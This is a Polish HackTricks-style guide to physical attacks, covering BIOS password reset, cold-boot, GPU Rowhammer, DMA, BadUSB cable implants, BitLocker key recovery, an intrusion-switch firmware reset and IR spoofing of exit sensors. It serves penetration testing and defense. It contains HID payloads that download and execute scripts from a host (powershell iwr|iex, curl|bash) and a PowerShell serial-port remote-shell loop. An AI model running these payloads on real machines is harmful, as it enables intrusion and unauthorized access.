# Ataki fizyczne

{{#include ../banners/hacktricks-training.md}}

## Odzyskiwanie hasła BIOS-u i bezpieczeństwo systemu

Ustawienia starszego oprogramowania układowego PC można zresetować, odłączając baterię CMOS lub używając opisanego w dokumentacji zworki clear-CMOS. Wymagany czas odłączenia zasilania zależy od płyty głównej. Nowoczesne hasła lub klucze UEFI mogą być przechowywane w nieulotnej pamięci flash, kontrolerze wbudowanym lub urządzeniu zabezpieczającym, dlatego odłączenie baterii może ich nie usunąć. Przed zwarciem pinów zapoznaj się z instrukcją płyty głównej lub serwisową; ta procedura może również unieważnić pomiary TPM i uruchomić procedurę odzyskiwania szyfrowania dysku.

W starszych systemach x86 narzędzia takie jak **killCMOS** i **CmosPwd** mogą sprawdzać lub zmieniać ustawienia zapisane w CMOS z poziomu środowiska rozruchowego. CmosPwd obsługuje formaty haseł z udokumentowanego zestawu starszych rodzin BIOS-u i może tworzyć kopie zapasowe, przywracać lub usuwać stan CMOS; opublikowane wersje są przeznaczone dla starszych środowisk DOS/Windows, Linux, FreeBSD i NetBSD.<sup>[[18]](#references)</sup> Te narzędzia nie są uniwersalnymi narzędziami do usuwania haseł UEFI i wymagają odpowiedniego dostępu do sprzętu lub oprogramowania układowego.

W niektórych laptopach po kilku nieudanych próbach wpisania hasła oprogramowanie układowe wyświetla kod wyzwania zależny od producenta. Bazy takie jak [bios-pw.org](https://bios-pw.org) mogą dla niektórych modeli wyliczyć starsze hasła odzyskiwania producenta, ale wiele systemów stosuje blokadę bez możliwości wyliczenia hasła na podstawie kodu wyzwania. Każde wygenerowane hasło traktuj jako specyficzne dla danego modelu i unikaj wyczerpania liczników prób, których nie można zresetować.

### Zabezpieczenia UEFI

W nowoczesnych systemach **UEFI** CHIPSEC może przeprowadzić audyt zabezpieczeń zmiennych Secure Boot. Najpierw uruchom poniższy test, który nie wprowadza zmian; opcjonalny tryb `-a modify` celowo próbuje uszkodzić zmienne i powinien być używany wyłącznie w możliwym do odzyskania systemie laboratoryjnym. CHIPSEC ostrzega, że jego uprzywilejowany sterownik i niskopoziomowy dostęp do sprzętu nie nadają się do produkcyjnych punktów końcowych.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analiza RAM i ataki cold-boot

DRAM nie traci natychmiast wszystkich bitów po ustaniu odświeżania. Tempo zaniku danych znacznie zależy od technologii modułu i temperatury; chłodzenie może zachować użyteczne dane znacznie dłużej niż cykl wyłączenia i ponownego uruchomienia bez chłodzenia. Atak cold-boot polega na szybkim ponownym uruchomieniu systemu w niewielkim środowisku do akwizycji danych albo przeniesieniu schłodzonego modułu, przechwyceniu surowej pamięci i odtworzeniu kluczy kryptograficznych mimo zaniku części bitów. Narzędzie do kopiowania dysków nie jest automatycznie narzędziem do obrazowania pamięci fizycznej, a Volatility analizuje zrzut, zamiast go pozyskiwać; używaj zweryfikowanego narzędzia do akwizycji danych odpowiedniego dla danej platformy.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer wymierzony w tablice stron

Współczesne ataki GPU Rowhammer są znacznie skuteczniejsze, gdy ich celem są **metadane pamięci wirtualnej GPU**, a nie zwykłe bufory. Niedawne badania nad **kartami NVIDIA Ampere z pamięcią GDDR6** pokazują, że atakujący, uruchamiając nieuprzywilejowany kod CUDA, może tworzyć wzorce hammeringu specyficzne dla GPU, stosować **memory massaging**, aby umieścić struktury stronicowania w podatnych wierszach, a następnie odwracać bity w **tablicy stron ostatniego poziomu** lub pośrednim **katalogu stron**. Po uszkodzeniu pojedynczego wpisu translacji atakujący może uzyskać **dowolny odczyt/zapis pamięci GPU**, a następnie przejść do kompromitacji hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Schemat eksploatacji

1. **Zidentyfikuj podatne na hammering wiersze** w pamięci GDDR6 i utwórz wzorce hammeringu uwzględniające odświeżanie / nierównomierne, które omijają zabezpieczenia wbudowane w DRAM.
2. **Przygotuj alokacje GPU** tak, aby sterownik umieszczał struktury translacji stron w podatnych lokalizacjach fizycznych, zamiast pozostawiać je w domyślnej, chronionej puli. W praktyce może to oznaczać wyczerpanie obszaru pamięci o niskich adresach przeznaczonego na tablice stron i rozrzucenie dużych, rzadkich mapowań UVM ze sterowanymi odstępami.
3. **Odwróć bity w metadanych translacji**, takich jak **PFN** lub bity związane z aperture we wpisie tablicy stron / katalogu stron, aby kontrolowana przez atakującego strona wirtualna wskazywała na strony tablicy stron, dowolną pamięć GPU lub mapowania systemowe widoczne dla hosta.
4. Wykorzystaj sfałszowane mapowanie do zmiany kolejnych wpisów translacji i uzyskania **dowolnego odczytu/zapisu pamięci GPU** w różnych kontekstach GPU.

### Przejście do hosta i zabezpieczenia

- Gdy **IOMMU jest wyłączone**, sfałszowane mapowania system aperture mogą udostępnić GPU dowolną **pamięć fizyczną hosta**, zmieniając prymityw GPU w pełną kompromitację hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** atakuje wpisy tablicy stron ostatniego poziomu, natomiast **GeForge** pokazuje, że uszkodzenie poziomu katalogu stron może być łatwiejsze, ponieważ odwrócenie jednego bitu może przekierować większe poddrzewo translacji. Nie traktuj tylko jednej warstwy stronicowania jako krytycznej z punktu widzenia bezpieczeństwa.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośredni dostęp do dowolnej pamięci hosta wykorzystywany przez GDDRHammer/GeForge, ale **nie stanowi pełnego zabezpieczenia**. **GPUBreach** pokazuje drugi etap ataku: atakujący uszkadza zapisywalne przez GPU bufory CPU należące do sterownika, a następnie wywołuje błędy bezpieczeństwa pamięci w sterowniku NVIDIA, uzyskując możliwość zapisu do jądra i **powłokę root** nawet przy włączonym IOMMU.<sup>[[3]](#references)</sup>
- **ECC na poziomie systemu** to praktyczne wzmocnienie zabezpieczeń w obsługiwanych kartach GPU do stacji roboczych i serwerów. Karty konsumenckie bez ECC oferują słabszą ochronę.<sup>[[4]](#references)</sup>
- Ataki te nie są czysto teoretyczne: **GeForge** zgłosił **1,171** odwróconych bitów na RTX 3060 i **202** na RTX A6000, co wystarczyło do utworzenia działającego łańcucha eskalacji uprawnień na hoście.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataki bezpośredniego dostępu do pamięci (DMA)

Informacje o modyfikowaniu IFR/NVRAM UEFI w trybie offline w celu obniżenia poziomu egzekwowania IOMMU przed uruchomieniem systemu i umożliwienia ataku DMA na Windows znajdziesz tutaj:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstruje pozyskiwanie i modyfikowanie pamięci za pomocą DMA przez interfejsy takie jak FireWire i wczesne konfiguracje Thunderbolt, w tym historyczne sygnatury omijania logowania. Nie jest to po prostu narzędzie „nieskuteczne wobec Windows 10”: podatność na atak zależy od interfejsu, wersji systemu docelowego, zasad IOMMU, stanu blokady oraz tego, czy funkcja Windows Kernel DMA Protection jest obsługiwana i włączona. Windows 10 w wersji 1803 i nowszych wprowadził Kernel DMA Protection na zgodnych platformach, znacząco zmieniając powierzchnię ataku.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Dostęp do systemu za pomocą Live CD/USB

W przypadku niezaszyfrowanego lub już odblokowanego woluminu Windows środowisko uruchomione w trybie offline może zastąpić pliki ułatwień dostępu, takie jak **sethc.exe** lub **Utilman.exe**, plikiem **cmd.exe**, co pozwala uzyskać wiersz poleceń SYSTEM po użyciu odpowiedniego skrótu na ekranie logowania. Narzędzia takie jak **chntpw** mogą modyfikować dane lokalnych kont SAM. Metody te nie omijają blokady woluminu BitLocker i mogą uszkodzić poświadczenia chronione przez DPAPI/EFS; zachowaj kopie kryminalistyczne i kopie zapasowe.

**Kon-Boot** to komercyjne narzędzie do omijania uwierzytelniania podczas uruchamiania, obsługujące wybrane konfiguracje Windows/macOS. Zgodność zależy od systemu operacyjnego, trybu firmware, Secure Boot i konfiguracji szyfrowania dysku; narzędzie nie odszyfrowuje zablokowanego woluminu BitLocker.<sup>[[10]](#references)</sup>

---

## Obsługa funkcji zabezpieczeń Windows

### Skróty uruchamiania i odzyskiwania

- **Delete/Supr**, F2, F10 lub inny klawisz producenta może otworzyć konfigurację firmware.
- **F8** otwiera starsze zaawansowane opcje rozruchu Windows tylko w konfiguracjach, w których ta ścieżka pozostaje włączona; obecnie sposób wejścia do środowiska odzyskiwania zależy od konfiguracji.
- Przytrzymanie **Shift** może w niektórych konfiguracjach wyłączyć automatyczne logowanie do Windows, choć ustawienia zasad/rejestru mogą wyłączyć takie działanie.<sup>[[17]](#references)</sup>

### Urządzenia BAD USB

Urządzenia takie jak **USB Rubber Ducky** i płytki Teensy mogą zgłaszać się jako zaufane klawiatury HID i wprowadzać zaprogramowane sekwencje klawiszy. Początkowo payload ma uprawnienia i dostęp do pulpitu takie jak zalogowana sesja; ograniczają go jednak monity UAC, blokada ekranu, układ klawiatury, synchronizacja oraz zasady USB na punktach końcowych.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Uprawnienia administratora lub kopii zapasowych pozwalają utworzyć kopię w tle albo zapisać ule rejestru, aby pozyskać zablokowane pliki, takie jak **SAM** i **SYSTEM**. Jest to technika zbierania danych po kompromitacji, a nie omijania kontroli uprawnień; należy skorelować ją ze zdarzeniami `diskshadow`/VSS i eksportem uli rejestru.

## Techniki implantów BadUSB / HID

### Urządzenie HID Androida wyzwalane przez NFC

Zrootowany telefon z Androidem może działać jako programowalna klawiatura USB tylko wtedy, gdy jego kontroler USB i jądro obsługują **USB gadget/HID**. Na zgodnych urządzeniach Kali NetHunter udostępnia profile gadget przez **USB Arsenal**. Inną opcją jest [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), który tworzy funkcje gadget ConfigFS i może udostępniać urządzenia znakowe klawiatury/myszy, takie jak `/dev/hidg0` i `/dev/hidg1`. Narzędzie tworzy jedynie punkt końcowy gadget; osobny proces musi zapisywać do niego raporty HID. Dostęp root nie zastąpi jądra pozbawionego ConfigFS, obsługi HID gadget lub użytecznego kontrolera USB Device Controller.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Ten punkt końcowy można połączyć z NFC w Androidzie, które pełni funkcję fizycznego wyzwalacza. Aplikacja [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) odczytuje UID znacznika, konwertuje go do oczekiwanej reprezentacji, sprawdza lokalną listę dozwolonych i po dopasowaniu wysyła skonfigurowaną sekwencję klawiaturową w stylu Rubber Ducky. Podłączony host widzi zwykłe dane wejściowe klawiatury i nie potrzebuje oprogramowania NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Przed użyciem skrótów lub poleceń sprawdź, czy urządzenie jest prawidłowo wykrywane i czy układ klawiatury działa, korzystając z pustego edytora tekstu. Nieszkodliwy payload:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Ważne granice zaufania:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **Biała lista UID służy do identyfikacji, a nie uwierzytelniania**. UID są publiczne, a niektóre typy tokenów lub emulatory umożliwiają klonowanie albo podszywanie się pod token. Skopiowany dozwolony UID przechodzi tę samą ścieżkę obsługi co oryginalny token.
- Moduł Magisk **NfcScreenOff** modyfikuje usługę NFC, aby zachowywała się tak, jakby ekran był włączony, a telefon odblokowany. Jeśli telefon jest już podłączony do hosta, może to umożliwić uruchomienie payloadu bez odblokowywania telefonu.
- Hasła, tokeny API i polecenia zapisane w payloadzie to możliwe do odzyskania sekrety na urządzeniu z rootem lub odblokowanym bootloaderem. Wpisywanie hasła przez HID to automatyzacja z użyciem wielokrotnego hasła, a nie uwierzytelnianie bezhasłowe.
- Wstrzykiwanie HID działa z uprawnieniami aktywnego pulpitu i zależy od fokusu, czasu oraz układu klawiatury hosta. Przed wykonaniem wrażliwych działań wymagaj niedawnego potwierdzenia użytkownika, unikaj umieszczania uprzywilejowanych sekretów w skryptach i używaj uwierzytelniacza z kryptograficznym challenge-response do prawdziwego uwierzytelniania.

### Implanty kablowe z Wi-Fi

- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, ukrywają się w kablach USB-A→USB-C lub USB-C↔USB-C, są wykrywane wyłącznie jako klawiatura USB i udostępniają swój stos C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z hosta ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` z hasłem `123456789` i przejść do [http://cable-wind.local/](http://cable-wind.local/) (lub jego adresu DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.<sup>[[8]](#references)</sup>
- Interfejs w przeglądarce zawiera karty *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane payloady są oznaczone według systemu operacyjnego, układy klawiatury można przełączać w locie, a ciągi VID/PID można zmieniać, by naśladować znane urządzenia peryferyjne.
- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotowywać payloady, uruchamiać je i zarządzać poświadczeniami Wi-Fi bez korzystania z sieci organizacji — przydatne podczas krótkotrwałych fizycznych włamań.

### Payloady AutoExec uwzględniające system operacyjny

- Reguły AutoExec przypisują jeden lub więcej payloadów do natychmiastowego uruchomienia po enumeracji USB. Implant przeprowadza uproszczone rozpoznanie systemu operacyjnego i wybiera pasujący skrypt.
- Przykładowy przebieg:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Ponieważ wykonanie odbywa się bez nadzoru, sama wymiana kabla do ładowania może zapewnić początkowy dostęp typu „plug-and-pwn” w kontekście zalogowanego użytkownika.

### Zdalna powłoka przez Wi-Fi TCP uruchamiana za pomocą HID

1. **Inicjalizacja za pomocą naciśnięć klawiszy:** zapisany payload otwiera konsolę i wkleja pętlę wykonującą wszystko, co nadejdzie przez nowe urządzenie USB serial. Minimalny wariant dla Windows:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Most kablowy:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Python, APK na Androida lub plik wykonywalny na komputerze) łączącego się z powrotem z operatorem. Wszystkie bajty wpisane w sesji TCP są przekazywane do opisanego wyżej loopu szeregowego, co umożliwia zdalne wykonywanie poleceń nawet na hostach odizolowanych od sieci. Ilość dostępnych danych wyjściowych jest ograniczona, dlatego operatorzy zazwyczaj uruchamiają polecenia bez informacji zwrotnej (tworzenie kont, przygotowywanie dodatkowych narzędzi itp.).

### Powierzchnia aktualizacji HTTP OTA

- Udokumentowany interfejs Evil Crow Cable Wind udostępnia nieuwierzytelniony endpoint aktualizacji firmware’u `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Operatorzy terenowi mogą wykonywać hot-swap funkcji (np. wgrać firmware USB Army Knife) w trakcie operacji bez otwierania kabla, dzięki czemu implant może przełączyć się na nowe możliwości, pozostając podłączony do hosta docelowego.

## Omijanie szyfrowania BitLocker

Autoryzowane pozyskanie danych kryminalistycznych z działającego lub niedawno uruchomionego systemu może obejmować główny klucz woluminu BitLocker lub powiązany materiał kluczowy, gdy wolumin jest odblokowany. Komercyjne narzędzia, takie jak Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic, mogą przeszukiwać obsługiwane obrazy pamięci, pliki hibernacji lub zrzuty awaryjne, ale powodzenie nie jest gwarantowane. Nowoczesny Windows szyfruje również zrzuty awaryjne, gdy włączony jest BitLocker, a zapisane 48-cyfrowe hasło odzyskiwania to inny artefakt niż klucz woluminu znajdujący się w pamięci.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Inżynieria społeczna w celu dodania klucza odzyskiwania

Atakujący, który nakłoni administratora do uruchomienia poleceń zarządzających BitLockerem, może dodać protector oparty na haśle odzyskiwania, kluczu zewnętrznym lub innym mechanizmie, a następnie go przechwycić. Hasło odzyskiwania nie może być dowolnym ciągiem zer: numeryczne hasła odzyskiwania BitLocker muszą mieć prawidłowy, 48-cyfrowy format. Składnia odpowiednia do autoryzowanego administrowania to `manage-bde -protectors -add C: -recoverypassword`; dodane protectory można wyświetlić poleceniem `manage-bde -protectors -get C:`. Monitoruj dodawanie protectorów i dopilnuj, aby nowy materiał odzyskiwania był przechowywany wyłącznie w zatwierdzonych lokalizacjach.<sup>[[16]](#references)</sup>

---

## Wykorzystanie przełączników otwarcia obudowy / konserwacyjnych do przywrócenia ustawień fabrycznych BIOS-u

Wiele nowoczesnych laptopów i komputerów stacjonarnych o małej obudowie ma **przełącznik otwarcia obudowy**, monitorowany przez Embedded Controller (EC) i firmware BIOS/UEFI. Chociaż głównym zadaniem przełącznika jest zgłaszanie alertu po otwarciu urządzenia, producenci czasami implementują **nieudokumentowany skrót odzyskiwania**, uruchamiany po przełączeniu go w określonej sekwencji.<sup>[[5]](#references)[[6]](#references)</sup>

### Jak działa atak

1. Przełącznik jest podłączony do **przerwania GPIO** w EC.
2. Firmware działający na EC śledzi **czas i liczbę naciśnięć**.
3. Po rozpoznaniu zakodowanej na stałe sekwencji EC uruchamia procedurę *mainboard-reset*, która **kasuje zawartość systemowej pamięci NVRAM/CMOS**.
4. Przy następnym uruchomieniu urządzenia modele, których to dotyczy, wczytują zresetowany stan firmware. W zależności od producenta i wersji, wyczyszczony stan może obejmować hasło nadzorcy, niestandardowe ustawienia rozruchu lub zarejestrowane klucze Secure Boot; stan TPM i skutki dla szyfrowania dysku należy ocenić osobno.

> Reset firmware może przywrócić opcje uruchamiania z nośników zewnętrznych, ale **nie** odszyfrowuje pamięci masowej. BitLocker lub inny system szyfrowania całego dysku może po zmianach TPM/firmware zażądać odzyskania, nadal chroniąc dysk wewnętrzny bez klucza odzyskiwania.<sup>[[16]](#references)</sup>

### Przykład z rzeczywistego świata – laptop Framework 13

Skrót odzyskiwania w Framework 13 (11., 12. i 13. generacji) wygląda następująco:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Po dziesiątym cyklu EC ustawia flagę nakazującą BIOS-owi wyczyszczenie pamięci NVRAM przy następnym uruchomieniu. Cała procedura trwa około 40 s i wymaga **jedynie śrubokręta**.<sup>[[5]](#references)</sup>

### Ogólna procedura eksploatacji

1. Włącz lub uśpij i wybudź urządzenie docelowe, aby uruchomić EC.
2. Zdejmij dolną pokrywę, aby uzyskać dostęp do przełącznika wykrywania otwarcia/serwisowego.
3. Odtwórz specyficzną dla producenta sekwencję przełączeń (sprawdź dokumentację i fora lub poddaj firmware EC inżynierii wstecznej).
4. Złóż urządzenie i uruchom je ponownie, a następnie sprawdź, które ustawienia firmware i dane uwierzytelniające faktycznie uległy zmianie.
5. Jeśli masz upoważnienie i dostępny jest rozruch z nośnika zewnętrznego, uruchom kontrolowany obraz live. Gdy wolumin wewnętrzny zostanie prawidłowo odblokowany (lub nigdy nie był szyfrowany), środowisko live może pozyskać dane uwierzytelniające i dane albo sprawdzić partycję EFI System. Modyfikacja tej partycji w celu zainstalowania implantu EFI jest trwała i wysoce inwazyjna, a ponadto podlega ograniczeniom związanym z Secure Boot, measured boot, ochroną firmware przed zapisem i monitorowaniem punktów końcowych. Zaszyfrowane nośniki pozostają niedostępne bez klucza lub materiału odzyskiwania.

### Wykrywanie i ograniczanie ryzyka

* Rejestruj zdarzenia otwarcia obudowy w konsoli zarządzania systemem operacyjnym i koreluj je z nieoczekiwanymi resetami BIOS-u.
* Stosuj **plomby zabezpieczające przed naruszeniem**, umieszczone na śrubach i pokrywach, aby wykrywać otwarcie.
* Przechowuj urządzenia w **fizycznie zabezpieczonych miejscach**; zakładaj, że dostęp fizyczny oznacza pełne przejęcie urządzenia.
* Jeśli to możliwe, wyłącz funkcję producenta „reset przez przełącznik serwisowy” lub wymagaj dodatkowego uwierzytelnienia kryptograficznego przy resetowaniu NVRAM.

---

## Ukryte wstrzykiwanie sygnału IR do bezdotykowych czujników wyjścia

### Charakterystyka czujników
- Popularne czujniki „wave-to-exit” łączą emiter diody LED bliskiej podczerwieni z odbiornikiem podobnym do modułu z pilota TV, który zgłasza stan logiczny wysoki dopiero po wykryciu kilku impulsów (~4–10) o prawidłowej częstotliwości nośnej (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastikowa osłona blokuje bezpośrednią widoczność nadajnika przez odbiornik, więc kontroler zakłada, że każdy zweryfikowany sygnał nośny pochodzi od pobliskiego odbicia, i steruje przekaźnikiem, który otwiera elektrozaczep drzwi.
- Gdy kontroler wykryje obecność celu, często zmienia obwiednię modulacji sygnału wyjściowego, ale odbiornik nadal akceptuje każdy impuls pasujący do przefiltrowanego sygnału nośnego.

### Przebieg ataku
1. **Zarejestruj profil emisji** – podłącz analizator stanów logicznych do pinów kontrolera, aby zarejestrować przebiegi przed detekcją i po niej, które sterują wewnętrzną diodą IR.
2. **Odtwórz tylko przebieg „po detekcji”** – odłącz lub zignoruj fabryczny nadajnik i steruj zewnętrzną diodą IR wzorcem, który normalnie pojawia się po wyzwoleniu, od samego początku. Ponieważ odbiornik reaguje wyłącznie na liczbę i częstotliwość impulsów, uznaje sfałszowany sygnał nośny za prawdziwe odbicie i aktywuje linię przekaźnika.
3. **Steruj emisją impulsową** – nadawaj sygnał nośny w dobranych impulsach (np. przez kilkadziesiąt milisekund, z podobną przerwą), aby dostarczyć minimalną wymaganą liczbę impulsów bez nasycania AGC odbiornika ani układów obsługi zakłóceń. Ciągła emisja szybko zmniejsza czułość czujnika i uniemożliwia zadziałanie przekaźnika.

### Dalekozasięgowe wstrzykiwanie sygnału przez odbicie
- Zastąpienie diody LED używanej na stanowisku testowym diodą IR dużej mocy, sterownikiem MOSFET i optyką skupiającą umożliwia niezawodne wyzwalanie czujnika z odległości około 6 m.
- Atakujący nie musi mieć bezpośredniej widoczności apertury odbiornika; skierowanie wiązki na widoczne przez szybę ściany wewnętrzne, regały lub ościeżnice pozwala odbitemu światłu trafić w pole widzenia o kącie około 30° i naśladować machnięcie dłonią z bliska.
- Ponieważ odbiorniki oczekują jedynie słabych odbić, znacznie silniejsza zewnętrzna wiązka może odbijać się od wielu powierzchni i nadal przekraczać próg detekcji.

### Latarka przystosowana do ataku
- Umieszczenie sterownika w komercyjnej latarce ukrywa narzędzie na widoku. Zastąp widoczną diodę LED diodą IR dużej mocy, dopasowaną do pasma odbiornika, dodaj ATtiny412 (lub podobny układ) do generowania impulsów o częstotliwości ≈30 kHz i użyj MOSFET-a do sterowania prądem diody LED.
- Teleskopowy obiektyw z zoomem zawęża wiązkę, zwiększając zasięg i precyzję, a silnik wibracyjny sterowany przez MCU informuje haptycznie o aktywnej modulacji, bez emisji światła widzialnego.
- Przełączanie między kilkoma zapisanymi wzorcami modulacji (nieco różniącymi się częstotliwością sygnału nośnego i obwiednią) zwiększa zgodność z rodzinami czujników sprzedawanymi pod różnymi markami. Dzięki temu operator może kierować wiązkę na różne powierzchnie odbijające, aż przekaźnik kliknie i drzwi się otworzą.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Turn a Rooted Android Phone into an NFC Authenticator and Automation Tool for Your PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)

{{#include ../banners/hacktricks-training.md}}
